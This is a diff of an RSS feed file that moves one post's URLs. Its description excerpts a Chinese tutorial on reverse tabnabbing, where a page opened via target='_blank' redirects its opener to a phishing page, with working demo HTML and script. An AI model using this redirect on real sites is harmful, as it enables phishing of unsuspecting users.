@@ -13,10 +13,10 @@
     
     <item>
       <title>利用_blank属性钓鱼</title>
-      <link>http://wyb0.com/posts/use-blank-attribute-to-fish/</link>
+      <link>http://wyb0.com/posts/2016/use-blank-attribute-to-fish/</link>
       <pubDate>Wed, 12 Oct 2016 10:24:38 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/use-blank-attribute-to-fish/</guid>
+      <guid>http://wyb0.com/posts/2016/use-blank-attribute-to-fish/</guid>
       <description>0x00 _blank _blank是html中的标签属性，如&amp;lt;a target=&amp;quot;_blank&amp;quot; href=&amp;quot;http://xss.reber-9.com/1.php&amp;quot;&amp;gt;HELLO&amp;lt;/a&amp;gt;, 但若点击HELLO打开的网页1.php中有如下代码：
 &amp;lt;script&amp;gt; if(window.opener){ window.opener.location = &amp;quot;http://xss.reber-9.com/fish.html&amp;quot;; } &amp;lt;/script&amp;gt;  则原网页将转跳到http://xss.reber-9.com/fish.html ，这就会造成钓鱼
 0x01 简单模板  a.html内容如下：  &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt; &amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;a target=&amp;quot;_blank&amp;quot; href=&amp;quot;http://xss.reber-9.com/1.php&amp;quot;&amp;gt;HELLO&amp;lt;/a&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;   http://xss.reber-9.com/1.php中1.php内容如下：  &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;test&amp;lt;/title&amp;gt; &amp;lt;script&amp;gt; if(window.opener){ window.opener.location = &amp;quot;http://xss.reber-9.com/fish.html&amp;quot;; } &amp;lt;/script&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;p&amp;gt;hello&amp;lt;/p&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;   1.php同级下有个钓鱼模板fish.html，内容如下：  &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;fish&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;h2&amp;gt;This is fishing template!&amp;lt;/h2&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;   点击a.</description>
